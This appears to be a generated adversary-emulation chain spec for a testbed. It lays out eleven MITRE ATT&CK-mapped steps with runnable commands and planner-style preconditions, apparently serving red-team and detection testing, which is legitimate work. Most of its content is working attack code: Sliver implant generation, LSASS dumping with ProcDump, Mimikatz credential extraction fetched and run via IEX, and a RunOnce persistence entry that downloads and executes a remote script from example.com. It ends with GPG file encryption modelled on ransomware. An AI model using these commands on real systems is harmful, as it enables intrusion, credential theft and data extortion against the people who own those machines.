# Chain 068

**Testbed**: `env0` · **Steps**: 11 · **Tactics touched**: Command and Control, Execution, Discovery, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1204.002, T1059.001 |
| Discovery | T1087.001 |
| Credential Access | T1003.001 |
| Persistence | T1547.001 |
| Impact | T1486 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file | Human |
| 3 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 4 | Discovery | T1087.001 | User Context Verification | Sliver Executor |
| 5 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file as Admin (Root) | Human |
| 6 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 7 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 8 | Credential Access | T1003.001 | Dump LSASS.exe Memory using ProcDump | Powershell Executor |
| 9 | Credential Access | T1003.001 | Offline Credential Theft With Mimikatz | Powershell Executor |
| 10 | Persistence | T1547.001 | PowerShell Registry RunOnce | Powershell Executor |
| 11 | Impact | T1486 | Data Encrypted with GPG4Win | Powershell Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download and execute malicious payload file

- **UUID**: `simulate-download-execute-file`
- **Source**: Manual
- **Supported platforms**: windows, linux
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:8000 in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed ?file - file ?target - host)`

---

### Step 3 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 4 — User Context Verification

- **UUID**: `sliver-whoami`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Discovery
- **MITRE ID(s)**: T1087.001
- **Technique(s)**: Account Discovery: Local Account


**Description**

The `whoami` command retrieves the current user identity of the system. It executes the command on the remote system and returns the username of the account that is currently logged in. This command includes flag for setting a timeout.

**Execution** (Sliver Executor)

```
whoami(session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(local-account-info-known ?target - host)`

---

### Step 5 — Simulate the victim download and execute malicious payload file as Admin (Root)

- **UUID**: `simulate-download-execute-file-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 6 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 7 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 8 — Dump LSASS.exe Memory using ProcDump

- **UUID**: `art-t1003_001-procdump-full-dump`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Sysinternals ProcDump with `-ma` (full memory dump) writes lsass.exe
memory to a target-side .dmp file. Uses Method 3 (fold get_prereq_command
from ART): if procdump.exe isn't already staged, download the Sysinternals
Procdump.zip, unzip, and copy the binary before invoking. ART
auto_generated_guid 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8.

**Execution** (Powershell Executor)

```
$procdump = "#{procdump_exe}"
if (-not (Test-Path $procdump)) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  $zipPath = "$env:TEMP\Procdump.zip"
  $extractDir = "$env:TEMP\Procdump"
  Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile $zipPath
  Expand-Archive $zipPath $extractDir -Force
  New-Item -ItemType Directory (Split-Path $procdump) -Force | Out-Null
  Copy-Item "$extractDir\Procdump.exe" $procdump -Force
}
& $procdump -accepteula -ma lsass.exe "#{output_file}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke ProcDump. | — | yes |
| `procdump_exe` | Target-side path where ProcDump is staged and invoked. | C:\\Users\\Public\\procdump.exe | yes |
| `output_file` | Target-side path for the resulting LSASS full memory dump. | C:\\Windows\\Temp\\lsass_dump.dmp | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(file-exists ?path - string ?f - file ?target - host)`
- `(lsass-dump-file ?f - file)`
- `(callback-covered ?f - file)`

---

### Step 9 — Offline Credential Theft With Mimikatz

- **UUID**: `art-t1003_001-mimikatz-offline-dump`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Mimikatz `sekurlsa::minidump <dumpfile>; sekurlsa::logonpasswords full`
processes an already-existing LSASS memory dump on target and prints
credential material to stdout. Chain-composition consumer: pair with
any dumper that emits `(lsass-dump-file …)` — ProcDump, NanoDump,
comsvcs.dll, rdrleakdiag, Out-Minidump, Silent Process Exit. Method 3
folds mimikatz staging (fetch latest release from GitHub API + unzip
via ART's Invoke-FetchFromZip helper). ART auto_generated_guid
453acf13-1dbd-47d7-b28a-172ce9228023.

**Execution** (Powershell Executor)

```
$mimikatz = "#{mimikatz_exe}"
if (-not (Test-Path $mimikatz)) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1' -UseBasicParsing).Content
  $releases = (Invoke-WebRequest 'https://api.github.com/repos/gentilkiwi/mimikatz/releases' -UseBasicParsing | ConvertFrom-Json)
  $zipUrl = $releases[0].assets.browser_download_url | Where-Object { $_.EndsWith('.zip') } | Select-Object -First 1
  $basePath = Split-Path (Split-Path $mimikatz)
  New-Item -ItemType Directory $basePath -Force | Out-Null
  Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
}
& $mimikatz "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" "exit"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke mimikatz. | — | yes |
| `mimikatz_exe` | Target-side path where mimikatz is staged and invoked. | C:\\Users\\Public\\x64\\mimikatz.exe | yes |
| `input_file` | Path to an existing LSASS memory dump file on the target (produced by an earlier dumper action). | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`
- `(file-exists ?path - string ?f - file ?target - host)`
- `(lsass-dump-file ?f - file)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 10 — PowerShell Registry RunOnce

- **UUID**: `art-t1547_001-powershell-runonce`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1547.001
- **Technique(s)**: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

**Description**

Sets `NextRun` under a Run/RunOnce registry path via PowerShell's
`Set-ItemProperty`. Payload runs at next system boot. Demonstrates
the PowerShell variant of the classic Run-key persistence pattern.
ART auto_generated_guid eb44f842-0457-4ddc-9b92-c4caa144ac42.

**Execution** (Powershell Executor)

```
Set-ItemProperty "#{reg_key_path}" "NextRun" '#{command_to_execute}'
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke Set-ItemProperty. | — | yes |
| `reg_key_path` | Registry path for the RunOnce entry. | HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce | yes |
| `command_to_execute` | Command line invoked at next system boot. | powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1') | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 11 — Data Encrypted with GPG4Win

- **UUID**: `art-t1486-gpg4win-encrypt`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1486
- **Technique(s)**: Data Encrypted for Impact

**Description**

Uses GPG4Win's gpg.exe with a symmetric passphrase to encrypt a target
file — mirrors ransomware pattern of "encrypt user data with a key
attacker controls". Requires GnuPG installed at the standard path
(present on many admin workstations, absent on hardened targets;
operator responsibility to provision). ART auto_generated_guid
4541e2c2-33c8-44b1-be79-9161440f1718.

**Execution** (Powershell Executor)

```
if (-not (Test-Path "#{file_to_encrypt}")) {
  Set-Content -Path "#{file_to_encrypt}" -Value "populating this file with some text"
}
& "#{gpg_exe}" --passphrase "#{passphrase}" --batch --yes -c "#{file_to_encrypt}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke gpg.exe. | — | yes |
| `gpg_exe` | Full path to gpg.exe on target. | C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe | yes |
| `file_to_encrypt` | Target-side path to the file GPG will encrypt. | $env:TEMP\\test.txt | yes |
| `passphrase` | Symmetric encryption passphrase (attacker keeps this to demand ransom). | SomeParaphraseBlah | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`

**Effects**

- `(data-encrypted ?d - data ?target - host)`

---
